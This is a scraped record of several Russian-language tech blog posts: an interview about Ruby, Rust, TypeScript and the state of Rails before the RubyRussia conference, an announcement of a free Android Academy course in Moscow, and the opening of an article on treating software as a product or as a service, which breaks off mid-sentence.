Я сам зарегистрировался в Skylight несколько дней назад для одного из проектов, сейчас тестирую его. Выглядит интересно, и с самого начала понятно, как все работает. Я пока не сильно углубился, но планирую со следующей недели начать пользоваться очень плотно. Надеюсь, смогу исправить некоторые проблемы с его помощью.\n\r\nОтлично, было бы здорово услышать фидбэк!\n\nИнтересно сравнить Ruby с другими языками. Например, с Rust. Ruby очень выразителен, и создан, чтобы сделать код читаемым. Если сравнить его с Python или с C++, C#, Java, они, на мой взгляд, не так легко читаются, как Ruby. Что ты думаешь об этом?\n\r\nЯ соглашусь. Есть два способа «выучить» новый язык. Первый — довольно поверхностный: изучаю основы синтаксиса, играю с примерами, а потом сразу забываю об этом. У меня так было с Go. Я позанимался им на выходных, затем еще пару недель писал на нем небольшие проекты. Но затем у меня не было причин продолжать программировать на Go. Я просто изучал его ради любопытства, и быстро забыл.\n\r\nС другой стороны, есть JavaScript / TypeScript, Rust и Ruby, которые я использую постоянно. Каждый из этих языков открыл новые возможности для меня, это здорово мотивирует.\n\r\nНапример, когда я начал работать с Ruby, меня привлекла выразительность. Ни один другой язык не позволял делать такие сумасшедшие вещи, как method_missing. Метапрограммирование, выразительность и читаемость кода — ключевые вещи, которые я люблю в Ruby. Было бы круто, если бы другие языки так могли.\n\r\nНо в них можно делать вещи, невозможные в Ruby. Например, JavaScript. С ним все было совсем не так, как с Ruby, в который я влюбился с первого взгляда. Я начал использовать JavaScript по необходимости, мне нужно было написать браузерный код. Хотим мы или нет, от JS никуда не деться. Если вы хотите написать интерактивное приложение для браузера, такое как Skylight (как раз то, что меня интересовало в то время), то JavaScript — единственный выход.\n\r\nЯ хотел перенести идеи, которые мне нравились в Ruby, в JavaScript, поэтому, в конце концов, стал работать с Ember. Это, в свою очередь, привело меня к TypeScript. Когда пишешь огромный фреймворк, типа Ember, на JavaScript, наличие типов и компилятора для проверки ошибок действительно помогает. JavaScript и TypeScript помогли мне это понять.\n\r\nИдеи, которым научил меня Rust, очень похожи на TypeScript. Приятно иметь возможность скомпилировать всю программу, и быть уверенным, что она работает. Как по мне — это просто круто. Я работал с компилируемыми языками раньше: с Java и C. В них ты тоже должен ждать, пока код скомпиллируется, но от этого не так много пользы, потому что система типов в этих языках не очень хорошо ловит ошибки. Но в Rust компилятор может гарантировать, что программа не вызовет проблем с памятью, и что во время ее выполнения не будет ошибок сегментации (segfault). Одна из самых сложных вещей в программировании на C — проблемы с памятью, которых очень трудно избежать. Главная фишка Rust для меня — возможность заниматься низкоуровневым программированием, не беспокоясь об этом.\n\r\nКстати, мой интерес к Rust был связан с Ruby. Я только начал работать в Tilde, и знал, что гем Skylight был написан на Rust. Подумал, что было бы здорово научиться писать нативные расширения для Ruby таким же образом. Я хотел научиться писать на Rust, чтобы не беспокоится о том, как бы не поломать пользовательские руби процессы, как это бывает при неправильном разыменовании указателей в C. Поэтому главной целью изучения Rust для меня, на самом деле, было написание нативных расширений для Ruby.\n\r\nКак раз сегодня утром работал над проектом с Питером Вагенетом из Tilde, и Шоном Гриффином из команды Shopify и core Rails team. Шон работает над новой версией Active Record, написанной на Rust, чтобы ускорить медленные части. А прямо перед этим интервью я работал над проектом на Rust под названием libcruby-sys, который позволяет писать нативные расширения для Ruby на Rust.\n\r\nВ конце концов, можно сказать, что все языки связаны. Языки, которые я изучаю и на которых программирую, — это просто инструменты, которые позволяют создавать то, что я задумал.\n\nОчень интересно! Круто, что ActiveRecord станет намного быстрее. Насколько я понимаю, сама идея ActiveRecord не поменяется. Я имею в виду, это будет все тот же ActiveRecord, а не что-то вроде Data Mapper?\n\r\nActive Record на Ruby, конечно, никуда не денется, он активно развивается, его используют. В случае с JRuby это первый выбор. Реализация Шона на 100% совместима с нативным API. Внутренности переписаны на Rust, поэтому все работает быстрее, но для конечного пользователя API не поменяется.\n\r\nТо же самое с проектом, над которым я работаю последние пару лет. Он называется Helix, и связан с моими экспериментами с Rust для создания нативных расширений для Ruby. Было очень сложно начать, из-за кучи вопросов с memory safety, которые надо было решить. Helix позволяет просто сосредоточиться на написании кода на Rust, он сам заботится о том, чтобы скомпилировать его в Ruby-extension.\n\r\nДумаю, многие использовали JSON gem в Ruby. На самом деле, есть две разные реализации этого гема. Существует чистая реализация на Ruby и расширение на C, которые реализуют одинаковый API. Это не заметно, но если написать `require json`, то скорее всего будет загружена версия на C. Если же текущая платформа не поддерживается, то это будет ruby-версия. Но, опять же, API в обоих случаях используется абсолютно одинаково. Единственное отличие в том, что внутренние компоненты для одного из них реализованы на C, поэтому он работает быстрее. Кроме более высокой производительности, нет никаких отличий. Это и есть цель всех таких проектов — иметь возможность использовать Ruby, который мы любим, но получать преимущества производительности нативного кода, когда это необходимо.\n\nЗдорово, что Ruby станет быстрее. Хотя есть мнение, что скорость исполнения не слишком важна для программ на Ruby, но, я уверен, все будут счастливы, если производительность увеличится. \n\r\nПо большей части согласен. В целом это так. Но, серьезно увеличив производительность, мы сможем делать вещи, ранее просто невозможные на данной платформе. Как я уже сказал, я изучил JavaScript, потому что хотел писать программы для браузера, а это невозможно сделать иначе. Я думаю, то же самое верно и для производительности. Мне все равно, если код работает на 20% быстрее. Это хорошо, но это не так важно. Но когда код работает в 10 раз быстрее — это открывает совершенно новые возможности.\n\r\nНапример, если вы занимаетесь машинным обучением, то приходится делать много сложных вычислений. Скорее всего, вы не сможете реализовать это на Ruby, потому что Ruby слишком медленный. Но если есть интерфейс для легко взаимодействия с нативными библиотеками машинного обучения, то вы можете работать с ML даже на Ruby. Можете написать код для оркестрации всех процессов с вычислениями на Ruby, со всей его выразительностью и экосистемой гемов. Для меня производительность — это инструмент для привнесения новых возможностей.\n\nЭто абсолютно верно! Я много раз боролся с низкой производительностью Ruby программ. Приходилось писать много кода на SQL, чтобы все ускорить, переносить часть логики на сторону базы данных, потому что это работает в сотни раз быстрее.\n\r\nПравильно, но я бы скорее переместил проблемный код в нативные расширения, а не переписывал его как микросервис на Go или Haskell. Я думаю, что хорошо иметь возможность писать как можно больше кода на Ruby, и перемещать критичные для производительности части куда-то, с чем можно легко взаимодействовать на Ruby. Сама такая возможность — прекрасна.\n\nДа, это должно быть быстрее и проще, эффективнее с точки зрения бизнес-задач. Не нужно нанимать программистов с разными навыками и стеками, раз уж все может быть написано на Ruby. Это звучит многообещающе. Что ты думаешь о будущем Rails? Каждый год ходят слухи о том, что Rails умирает...\n\r\nЯ предвзят, потому что работаю в компании, основным продуктом которой является инструмент контроля производительности в Rails. Лично я не думаю, что они умирают, но Rails определенно стал взрослее, “заматерел”. Для многих людей в сообществе это что-то принципиально новое. Многие из нас присоединились к сообществу Rails и Ruby, когда Rails был хайповой темой. Было много восторгов, куча нововведений. Хотя, многие наши «нововведения» были обычными вещами в других, более взрослых, экосистемах. Многое было невозможно тогда, потому что экосистема была еще незрелой.\n\r\nЭто было очень захватывающее время. Каждый понедельник я с нетерпением ждал нового эпизода RailsCasts. Новый гем каждую неделю. Например, на этой неделе мы создаем PDF-файлы, на следующей неделе загружаем файл, а затем появляется что-то принципиально новое, такое, как bundler, например. Это было время свежих идей, волнительное, у всех была куча энергии. Многие считают что Rails или Ruby умирают из-за того, что эти эмоции ушли.\n\r\nА на мой взгляд, экосистема просто созрела и стала стабильнее. Мы уже провели эксперименты с 5 совершенно разными способами загрузки файлов и нам просто не нужно делать это каждую неделю. С точки зрения эмоций, я определенно скучаю по тем временам. Но не думаю, что сейчас стало хуже. Можно сказать так: “ок, мы прошли все эти приключения, попробовали разные подходы, получили уроки. И теперь мы выбрали лучший вариант, который все и будут использовать”. Я думаю, это здорово.\n\r\nЧасть меня определенно скучает по тому драйву, постоянному чувству перемен и прогресса, которое было в то время в Ruby сообществе. Сейчас я вижу это в сообществе Rust. Там я могу испытывать те же эмоции. Да, в Ruby страсти улеглись. Но с точки зрения производительности и реальной работы — все совсем неплохо. Понимаю, что у человека, который любит постоянно учиться новому, есть необходимость в таких эмоциях. Я ищу и нахожу их в других экосистемах. Сообщество созревает, и изменений все меньше. Но лично мне это подходит.\n\nЯ думаю, что это естественный порядок вещей, и Rails по-прежнему прекрасен. Все что происходит — идет на пользу реальному бизнесу, который разрабатывает коммерческие приложения. Мне нравится, что Rails позволяет использовать разные подходы. Например, можно использовать trailblazer или dry-rb гемы, оставаясь в контексте Rails. Можно использовать различные виды абстракций в своем коде, но в конечном итоге это все равно будет Rails приложение. Это то, что мне нравится.\n\r\nЯ определенно согласен с тобой. Думаю, что вся экосистема взрослеет. В то время, которое мы сейчас называем «пиком» Rails, появлялось много новых стартапов. Никого не волновала стабильность и устойчивость. Тогда вы получаете постоянный приток новых эмоций и энергии. Теперь многие из этих компаний превратились в крупные корпорации, такие как Github или Shopify, и начали заботится о стабильности. Это справедливо для многих.\n\r\nКак сообщество, мы коллективно решили предпочесть стабильность экспериментам. С точки зрения языка, есть еще много места для экспериментов, потому что Ruby остается тем же. Причина, по которой Ruby был великолепен для экспериментов, никуда ни делась. Тем не менее, сообщество решило сосредоточиться на создании вещей, которые работают на Rails, потому что Rails уже давно и активно используется. Когда вы пишете гем, вы, вероятно, сделаете поддержку несколько версий Rails, потому что есть много компаний, которые их используют. В результате Rails сами также становятся более осторожным, не ломают свой API без необходимости. Лично я счастлив быть частью этого процесса.\n\nС точки зрения бизнеса стабильность очень важна. Особенно, для высоконагруженных систем. Стабильность интерфейсов фреймворка облегчает работу. Я помню времена, когда было очень трудно перейти от одной версии Rails на другую. Например, в тот момент, когда приложение стало выкидывать кучу ошибок из за несовместимости кодировок (encoding incompatible).\n\r\nTrailblazer — отличный пример, который показывает нынешнее состояние сообщества и экосистемы. С одной стороны, тот факт, что он существует, является довольно хорошим доказательством того, что в сообществе Ruby еще много места для экспериментов. Но я думаю, что если бы он вышел 5 лет назад, то был бы гораздо популярнее, потому что теперь мы построили гораздо большую экосистему вокруг Rails, с большим количеством гемов.\n\r\nВ конце концов вы больше заботитесь о том, что можно сделать с помощью знакомого стека. Когда нужно просто написать приложение, которое умеет выставлять счета, делать PDF-файлы и использует веб сокеты, многие люди предпочтут использовать то, что уже используют другие — в этом случае можно делиться гемами, обсуждениями, находить ответы на StackOverflow и т. д.\n\r\nВ этом смысле можно сказать, что часть Ruby-сообщества умерла. 5-10 лет назад ты постоянно делал новые вещи, не слишком беспокоился о совместимости, использовал новые и самые крутые гемы, потому что за спиной не было “багажа”. Теперь у большинства проектов в сообществе “багажа” накопилось порядочно. А те, кто любит эксперименты и инновации, переместились в другие сообщества и экосистемы.\n\nЯ думаю, что это нормально.\n\r\nЯ тоже не против. Это похоже на взросление, другой этап жизни.\n\nЧто ты думаешь о статической типизации? Есть ли перспектива получить преимущества этого подхода в Ruby?\n\r\nЯ жду этого с нетерпением, потому что уже испытал преимущества этой штуки в экосистеме JavaScript с TypeScript. JavaScript очень похож на Ruby. Это динамический язык со свободной типизацией, поэтому в нем много гибкости, но еще больше ошибок во время выполнения. TypeScript — это попытка надстроить над JavaScript систему типов, суперсет JavaScript синтаксиса. Когда вы компилируете код, компилятор проверяет типы, проверяет, что все правильно, а затем просто стирает их. Когда вы удаляете все типы из файлов TypeScript, вы возвращаетесь к чистому JavaScript.\n\r\nЯ вижу, что этот подход на удивление хорошо работает. Люди уже построили целую экосистему вокруг TypeScript. Мне бы очень хотелось увидеть ту же историю в Ruby. Гениальность идеи заключается в том, что TypeScript является суперсетом синтаксиса JavaScript, это новый слой, он не запрещает использовать что угодно из JavaScript экосистемы. Программист старой формации может просто взаимодействовать с нетипизированной версией кода. Другие разработчики могут получить все плюсы типизации, просто взглянув на типизированную версию. Но, в конечном счете, каждый сможет вызывать библиотеки обычным образом. Даже если использовать только стандартный JavaScript, можно получить пользу от типов, например, используя автодополнение, потому что кто-то уже сделал работу по добавлению типов в используемые библиотеки JavaScript. На мой взгляд, TypeScript является большой победой для всех в сообществе JavaScript, независимо от того, используете вы его напрямую или нет.\n\r\nВероятно, есть способ сделать это и в Ruby, никого ни к чему не принуждая. Люди, которым нравится типизация, будут выполнять свою работу, и все выиграют от этого, будь то автодополнение в редакторе, или просто знание того, что вся инфраструктура, например, Rails, содержит меньше багов, потому что внутри она использует типы, а это помогает ловить ошибки на этапе компиляции, а не во время исполнения. Мне бы очень хотелось, чтобы в Ruby это стало возможным.\n\nЯ полностью согласен. Думаю, что это будет большим шагом к стабильности приложений. А еще облегчит жизнь джуниорам: у них будет меньше шансов делать ошибки. Сейчас нужно быть очень осторожными с именованием переменных, чтобы дать понять, что хранится внутри них. Когда я пишу код, я должен очень ясно выразить, какой тип значения ожидается в той или иной переменной, чтобы меня правильно понял человек, который прочитает мой код. Если у нас будут типы, это станет проще.\n\r\nЛюди, которым нравятся типы, фактически используют их для документации кода. Если все сделано правильно, TypeScript отлично справляется с этим. Он читается практически как самодокументируемый код. Даже если вы не хотите смотреть на типизированный код, вы можете посмотреть JavaScript версию. Но благодаря тому, что кто-то выполнил работу по добавлению типов, можно сгенерировать документацию для нетипизированного кода.\n\r\nЯ считаю, что ключевой момент тут — это разделение слоев абстракции. Некоторые люди с большим энтузиазмом относятся к типам, а другие их сильно не любят. История TypeScript показывает, что есть способ сосуществования и совместного использования этих подходов. Я немного переживаю о том, в каком направлении двигаются типы в Ruby. Я лично предпочел бы найти способ, с помощью которого мы можем накладывать типы поверх Ruby и позволять двум мнениям сосуществовать друг с другом, а не идти на кучу компромиссов.\n\nНесколько лет назад, к нам на RailsClub приезжал Матц. Мы, конечно, поговорили с ним о типизации. У меня было ощущение, что он не слишком оптимистично настроен. Хотя, все могло поменяться.\n\r\nЯ думаю, что если Матц не любит типы, я бы предпочел способ, где Матцу никогда бы не пришлось видеть их в коде, вместо того, чтобы пытаться писать их так, чтобы это было терпимо для него, например, что-нибудь наподобие комментариев.\n\nЯ могу ошибаться, но думаю, что идея Матца заключается в том, что проще программировать без типов, чем с ними.\n\r\nЭто действительно проще для большинства, а во многих случаях и для меня лично. Но в некоторых типах программ, например, в Rails, вы переходите грань. Без типов приходится хранить кучу информации в своей голове или в документации. В какой-то момент это становится слишком тяжело, особенно для такого большого проекта, как Rails. Я думаю, что даже для JavaScript есть такие приложения, где преимущества типов не стоят всех их сложностей. Но есть огромные проекты, такие как Ember, которые сильно выиграли от использования TypeScript. Как я уже сказал, красота разделения на слои заключается в том, что в итоге вы все равно получаете JavaScript код. Вы можете выбрать тот или иной путь, не затрагивая другую половину сообщества, которая не разделяет ваших идей. По крайней мере, мой опыт именно такой.\n\nКакой совет ты можешь дать новичкам? Каким будет основное направление в программировании в ближайшие 5 лет?\n\r\nЭто огромная тема, ее можно очень долго обсуждать.Но у меня есть 2 совета.\n\r\nВо-первых, вместо того, чтобы гоняться за «мейнстримом», идите за тем, что вас интересует. Может быть, мне просто повезло, но это очень помогло. Когда я погрузился в Ruby, я начал искать работу, которая позволила бы мне писать на нем. Поскольку я был очень мотивирован, чтобы узнать о Ruby больше, я начал делать коммиты в open source, и это помогло моей карьере в последующем. Это первый совет. Следуйте за тем, что вам интересно. Если вы мотивированы, вероятность того, что вы сделаете свою работу хорошо, намного выше.\n\r\nВторой совет я подробно описал в той статье на Medium. Нужно основательно подходить к процессу обучения, потому что независимо от того, что вы делаете, обучение — ключевая часть работы. Я рекомендую найти хорошие способы узнать больше, чем вы уже знаете, двигаться к тем территориям, которые вам не знакомы, и выяснить, как создавать и менять модели мышления для разных концепций. Обучение — один из ключевых навыков, которым вы должны владеть, чтобы развиваться в программировании.\n\nЯ думаю, что высшее образование важно и сегодня. Оно дает людям глубокое понимание и основы, которые не слишком сильно изменились. Основные принципы работы компьютера или базы данных почти не меняются. На более высоких уровнях появляется много всего нового, но основы все те же на протяжении десятилетий. Я думаю, что высшее образование ценно. А ты?\n\r\nЯ согласен, университеты все еще важны. Я лично много получил от высшего образования. При этом мне не нравится термин «основы». Всегда есть что-то дальше «основ», которое ты можешь изучить. Главное понять, что всегда есть что-то глубже того, что вы знаете, и оно ждет своего открытия. И если вы начнете копать, вероятно, это удивительным образом вам поможет.\n\r\nНапример, в университете я изучал много операционных систем, компиляторов и т. д. Но я почти не использовал эти знания, потому что я работал в основном с Ruby. Совсем недавно мне пришлось вспоминать все это, потому что я начал работать над утилитами, которые позволяют компилировать код на Rust в нативные расширения для Ruby. Это заставило меня заново изучить все эти вещи. Я должен был бы это уже знать, но забыл почти все подробности. Но я помнил ключевые понятия и знал, что мне нужно загуглить. И, что более важно, тот факт, что я уже изучал этот материал ранее, дал мне уверенность в том, что я смогу разобраться в этой теме. Это — очень ценно для мотивации.\n\nНа твой взгляд, насколько полезно для разработчика заниматься обучением и менторством?\n\r\nМне очень нравится эта тема, и это важная часть моей работы. Обучение, наставничество — неотъемлемая часть любой организации, основа ее культуры. В программировании это особенно важно, потому что всегда есть чему поучиться. \n\r\nМы в компании стараемся помогать людям изучать то, что им интересно. Например, сейчас я обучаю пару коллег программированию на Rust в контексте текущих проектов. Мы хотим переписать больше бэкэнда с Java на Rust. Для компании важно, чтобы у нас было больше людей с опытом в Rust. Это инвестиции, поэтому мы прилагаем для этого усилия. Когда человек в компании интересуется Rust — пытаемся выяснить, как дать ему необходимые для учебы ресурсы и время.\n\nЯ считаю, что наставничество — это хороший способ самому научиться. Когда учишь кого-то, сам учишься делать это намного лучше.\n\r\nЯ каждую неделю даю уроки Rust, и каждый раз я понимаю, как много не знаю о нем. Когда пытаюсь объяснить вещи, которые, как я думал, знаю, всегда обнаруживается что-то, о чем я и понятия не имел. Я трачу много времени после каждого урока, чтобы изучить материал, который, как я думал, уже знаю. Отличный источник опыта.\n\nКстати, я хотел бы поблагодарить тебя за рассылку «This Week in Rails».\n\r\nСпасибо! У меня самого больше нет времени, чтобы писать эти письма, так что благодарить теперь нужно не меня. Ребята, которые сейчас их пишут, знают свое дело. И теперь, как читатель рассылки, я тоже очень ценю их работу.\n\nЯ получал эти письма, по крайней мере, последние 2 года. Интересно по понедельникам читать, что произошло на прошлой неделе в сообществе Rails!\n\r\nЭто было очень весело! Я рад, что начал этот проект.\n\nСпасибо! Давай на последок поговорим о конференции. Остался всего месяц до RubyRussia. Чего ожидаешь от поездки в Россию? \n\r\nЯ не был в России и, честно говоря, понятия не имею, чего ожидать. Но я думаю, будет очень весело. Я очень рад, что приеду и уверен, что все будет хорошо. Чего я должен ожидать? Есть ли что-нибудь, к чему я должен быть готовым?\n\nХа-ха, кроме прочего, у нас будет отличное афтепати, прошлогоднее всем запомнилось. Много всего: конференция, экскурсии, и не только. Будет весело! Люди здесь дружелюбные, и я уверен, что у нас будет много интересных тем для обсуждения.\n\r\nЯ с нетерпением жду и очень благодарен за приглашение! Я как-то никогда не задумывался о том, чтобы посетить Россию. Но теперь понял, что должен был бы сделать это раньше. Думаю, я отлично проведу время!\n\nНадеюсь поговорить лично на конференции. \n\r\nЖду с нетерпением!\n\nБыло очень интересно поговорить! Спасибо за уделенное время! Хорошего дня! Увидимся в Москве!\n\r\nВас тоже ждем на конференции! Задать свои вопросы лично (и на легендарном афтепати :) можно будет 6 октября. Программа тут, а до повышения цены осталась примерно неделя. Сейчас билет стоит 8000 рублей.\n\r\nПрочитать оригинал на английском можно на hype.codes.\n\r\nА тут место для благодарности отличным компаниям, которые подерживают главное Ruby-событие в России:\n\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребярные партнеры — Instamart, UCHi.ru, JetBrains\r\nБронзовые партнеры — Bookmate и InSales", {"day": "11", "month": "сентября", "time": "12:02"}, {"rate": 6, "views": 1200}], ["5 сентября стартует базовый курс Android Academy по Android-разработке (Android Fundamentals). Встречаемся в офисе компании Avito в 19:00.\n\r\nЭто очное и бесплатное обучение. За основу курса мы взяли материалы Android Academy TLV, организованной в Израиле в 2013 году, и Android Academy SPB.\n\nРегистрация откроется 25 августа, в 12:00 и будет доступна по ссылке\n\r\nПервый базовый курс в Москве – это 12 встреч, по программе: \n\n\nВведение в Android\nПервое приложение — «Hello World»\nРабота с View\nРабота со списками\nМногопоточность в Android\nСетевое взаимодействие\nЛокальное хранение данных\nРабота с Fragments\nСервисы и фоновая работа\nАрхитектура\nИтоги и то, что мы упустили\nПодготовка к хакатону\n\nКого мы ждём?\r\nВам будет комфортно, если вы попадаете в одну из групп:\n\n\nЗнакомы с основами Java или ООП в принципе;\nЗанимаетесь разработкой в любой области около 2-ух лет;\nСтудент старшего курса IT-специальности.\n\r\nЕсли вы занимаетесь объектно-ориентированным программированием, вам будет проще сфокусироваться на главном предмете курса – возможностях Android и как с ними работать. Вам будет комфортно, если вы уже, например, разрабатываете фронтенд или бэкенд, используете в своей работе Ruby или C#, или вы студент старшего курса IT-специальности.\n\r\nПо завершении курса вы поучаствуете в 24-часовом хакатоне и создадите свое собственное полноценное приложение под руководством наших лекторов и менторов.\n\r\nНо это не главное…\n\nТак-так, а что же главное?\r\nСейчас проводится много курсов по разработке. Как правило, вы выполняете задания, получаете сертификат, чатик вашей группы закрывается, и вы одиноко уходите в свое плавание. \n\r\nВ Android Academy все по-другому. Это не просто образовательная площадка, а сообщество профессиональных разработчиков. Пройдя подготовку на курсе, вы становитесь частью сообщества, в котором люди помогают друг другу: найти интересный проект, решить разработческие задачи, и не только. \n\r\nЭто место, куда можно прийти за советом, как и что делать, как разрабатывать. Периодически проводятся встречи разработчиков и мастер-классы.\n\nЙонатан Левин (KolGene)\n\n«Маленький курс основ разработки под Android положил начало сообществу знающих, опытных разработчиков, которые за 5 лет существования Android Academy выросли в тимлидов, экспертов, ведущих разработчиков.»\n\n\nЗвучит круто. Почему бесплатно?\r\nМенторство на курсе Android Academy — это не работа «в одну сторону», когда ты только делишься своими знаниями и временем. Наши менторы и преподаватели — это опытные разработчики и эксперты в своих областях, которые продолжают развиваться, и разделяют основную идею академии: чтобы лучше разобраться в предмете, нужно попробовать объяснить или показать его другим.\n\nАлександр Блинов (HeadHunter, xanderblinov)\n\n«Есть очень крутые разработчики, есть даже гениальные, но лишь обмен знаниями и опытом позволяет двигаться большИми шагами.\r\nТолько сильное и сплоченное сообщество способно совершать прорывы и развивать отрасль! Мы стартуем Android Academy, чтобы укрепить сообщество Android разработчиков и пополнить его свежими идеями.»\n\r\nКурируя работу студентов, менторы и сами обмениваются опытом. Они перелопачивают горы материала в поисках оптимальных решений и лучших объяснений. Более того, в Android Academy есть «программа менторов», в рамках которой проводятся семинары и занятия специально для менторов. Например, Светлана Исакова провела эксклюзивный мастер-класс по Kotlin, когда он только вышел.\n\r\nТе, кто уже состоит в сообществе, могут стать менторами для вновь пришедших и развиваться вместе с ними, взяв на себя ответственность за их успех.\n\r\nК тому же это отличная возможность для менторов привлечь к своим проектам разработчиков, которых они сами и «воспитали». По окончании курса в академии формируются специалисты, не только глубоко изучившие особенности Android-разработки, но и позитивно заряженные на работу в команде. \n\r\nВо время обучения студенты выполняют задания в группах: для них создается максимально дружелюбная атмосфера взаимопомощи и обмена опытом, которую они потом переносят в проекты и компании.\n\nЕвгений Мацюк (KasperskyLab, xoxol_89)\n\n«Круто, когда есть комьюнити любящих свое дело людей. Комьюнити, которое поможет тебе сделать первые шаги в большом мире мобильной разработки, подскажет тебе, направит тебя и даст веру в свои силы и свой талант. \r\nAndroid Academy — это и есть то самое комьюнити.»\n\nПочему мы решили запустить Android Academy в Москве?\r\nПрежде всего мы хотели, чтобы люди, увлеченные разработкой, могли глубже изучить Android, создать решения, которыми бы они гордились, и действительно полюбить свое дело. \n\nАлексей Быков (KasperskyLab, NoNews)\n\n«Я помню свои ощущения, когда я написал свое первое приложение и осознал себя Android-разработчиком. У меня был такой невероятный прилив энергии и вдохновения, что я даже начал бегать. Я хочу, чтобы каждый испытал подобные ощущения, найдя свое любимое дело. Будет здорово, если Android Academy поможет кому-то осознать, что его или ее любимое дело – это Android-разработка.»\n\r\nДля нас важна атмосфера. Android Academy предлагает формат «открытых дверей», отличающий ее от других курсов. \n\r\nУ нас будут не лекции, а скорее теплые встречи, на которых приветствуются любые вопросы и живые обсуждения. \n\nГде будут проходить встречи?\r\nПервые 6 встреч будут проходить в компании Avito, в которой так же часто проходят встречи бекенд и мобильных разработчиков, тестировщиков, Android Peer Lab, где разработчики могут обсудить наболевшие вопросы в неформальной ламповой атмосфере.\n\r\nОстальные места будут объявлены в процессе проведения курса.\n\nРезюмируем, что даст вам этот курс?\n\nВы поймете, является ли Android-разработка вашим призванием.\nВы научитесь разрабатывать, понимая и активно используя возможности Android.\nПознакомитесь с классными разработчиками, позитивно заряженными на работу в команде, саморазвитие и обмен опытом.\nСтанете частью сообщества Android-разработчиков, где вам всегда будут рады помочь.\n\nРегистрация откроется 25 августа, в 12:00 и будет доступна по ссылке\n\nНаши лекторы\n\nЙонатан Левин\n\nОснователь и лектор Android Academy TLV, лидер сообщества. Соучредитель и технический директор healthcare-стартапе KolGene, генетического market connector-а. Android Tech Lead в компании Gett почти с основания и до декабря 2016 года. Один из ведущих израильских мобильных разработчиков, часть элитной команды Google Developer Experts.\n\nАлексей Быков\n\nЗанимаюсь Android-разработкой с 2016 года. \r\nВ данный основная часть моей жизни связана с проектами Kaspersky Security Cloud и Kaspersky Secure Connection в компании KasperskyLab, также преподаю Java в одной из математических гимназий при компании.\r\nЧасто посещаю тематические конференции и встречи, иногда в качестве спикера. Фанатею от мобильного UX.\n\nАлександр Блинов\n\nРуководитель Android-направления в группе компаний Headhunter. Я занимаюсь Android-разработкой с 2011 года. Выступал с докладами на многих конференциях, в том числе Mobius, Dump, Droidcon Moscow, Appsconf, Mosdroid, Devfest-ы в различных городах России. Мой голос вам может быть знаком по подкасту о разработке под Android «Android Dev Podcast». Являюсь соавтором и техническим евангелистом MVP фреймворка «Moxy». Для меня важно развитие команды, компании и Android сообщества. Каждый день я просыпаюсь с мыслью: «Что я могу улучшить сегодня?»\n\nЕвгений Мацюк\n\nЗанимаюсь Android-разработкой с 2012 года. Мы многое пережили вместе, много повидали, у нас порой были ссоры и недопонимания, но за это время мои чувства к Android до сих пор не остыли, потому что Android крутой, и делает нашу жизнь лучше. На данный момент я возглавляю команду мобильного флагмана KasperskyLab — Kaspersky Internet Security for Android. Выступал с докладами на таких митапах и конференциях, как Mobius, AppsConf, Dump, Mosdroid. В Android-сообществе известен своими трудами по Clean architecture, Dagger, RxJava. Фанатично борюсь за чистоту кода.\n\nСергей Рябов\n\nЯ независимый Android-инженер и консультант, выходец из «большой» Java. Соорганизатор первой в России Kotlin User Group в Питере и Android Academy SPB, спикер Mobius, Techtrain, различных GDG DevFest'ов и митапов. Kotlin-евангелист.", {"day": "20", "month": "августа", "time": "11:46"}, {"rate": 9, "views": 6800}], ["На Хабре (да и в реальной IT жизни) встречаeтся много вопросов вида:\n\nНадо ли обновлять систему (или зависимости в приложении), если и так всё работает?\nНужны ли вообще тесты (автотесты) в приложении (вы ведь на них потратите своё время и деньги заказчика)?\nЕсли ли смысл в паттернах и выделении абстракций (ведь подобное размазывает код, приводит к снижению производительности и т.д.)?\n\nКлючевой вопрос во всех примерах ниже: что вы разрабатываете: товар или сервис? Как ни странно, но как только вы ответите на этот вопрос о товарах и сервисах, все сомнения о необходимости тестов, абстракций и т.д. отпадут сами собой.\nТермины\nВ них есть принципиальная разница: товар обладает законченностью, его можно продать, а потом забыть о его существовании. В случае сервиса, покупатель и продавец общаются долго (по аналогии с подпиской, которая является этим самым сервисом).\nПримеры продуктов:\n\nСтроительство моста. Собственно, мост построен, сдан (это принципиально важный шаг), компания-строитель забыла о нем. В реальности еще существует гарантия на постройку, однако для сферичности эксперимента лучше пока сделать вид, что она отсутствует (или же очень короткая). При строительстве будет абсолютно нелогично менять планы в процессе (например, вернуть привезенную ограду и купить другую, более эффективную).\nПродажа табуретки. Всё аналогично мосту, самое главное — продать эту самую табуретку. После этого продавец забудет про покупателя очень надолго (по крайней мере, в большинстве случаев).\nПродажа квартиры (особенно на вторичном рынке). Тут опять-таки, самое важное — продать квартиру так, чтобы она не развалилась в первые месяцы. А что будет дальше — продавцу абсолютно неважно.\n\nПримеры сервисов:\n\nБанковское обслуживание. Клиент платит за обслуживание раз в месяц, банк предоставляет сервис весь этот месяц. Клиент и банк помнят друг о друге как минимум весь месяц, а зачастую и несколько лет. Нет смысла продавать неликвид, ведь клиент откажется от обслуживания довольно быстро.\nСервис такси (т.е. Яндекс Такс, Gett и пр.). Несмотря на то, что поездки носят законченный характер, компании делают основные деньги на постоянных клиентах, на тех, которые возвращаются. Поэтому нет никакого смысла обманывать покупателя в первую же покупку (в стиле бомбил), так как отношения здесь длительные.\nСупермаркет. Опять-таки, нам длительность общения продавца и покупателя намного важнее сиюминутной выгоды. А этом значит, что вместо продажи испорченного хлеба, магазину выгоднее утилизировать партию. Иначе покупатель купит хлеб в последний раз и не придет в магазин вообще. Более того, в отличии от примера с мостом, для супермаркета абсолютно нормально проводить \"рефакторинг\" — анализ того, насколько стеллажи стоят эффективно и т.д.\n\nЗачем нам знать разницу между товаром и сервисом?\nИдея проста: если вы рассматриваете свою программу как товар (то есть ваша связь с ней прервется после первого релиза), то нет никакого смысла тратить лишнее время ни на тесты, ни на рефакторинги, ни на соответствие стилям кодирования. Ведь если вы потратите своё время и сделаете \"на отлично\", то ваш продукт просто удорожает. А в дальнейшем эти абстракции будут просто вам не нужны (ведь вы-то прекратите работать над программой).\nОднако если вы оказываете сервис для пользователей (например, делаете аналог Facebook), то у вас будут задачи обновления зависимостей, у вас будут задачи добавления/удаления функций, а потому тесты всё-таки будут, ибо они снизят риски в долгосрочной перспективе. Более того, вам потребуется выделять абстракции, как минимум для того, чтобы в будущем встраивать новую логику. Итого, если вы рассматриваете свою разработку как сервис, то вам необходимо обновлять зависимости, писать тесты, выделять абстракции и делать немало другой работы по уходу от legacy и минимизации рисков ошибки в будущем.\nПособие: как сделать из программы legacy своими руками\nВ контексте этой статьи можно очень легко вывести формулу того, как можно очень просто из практически 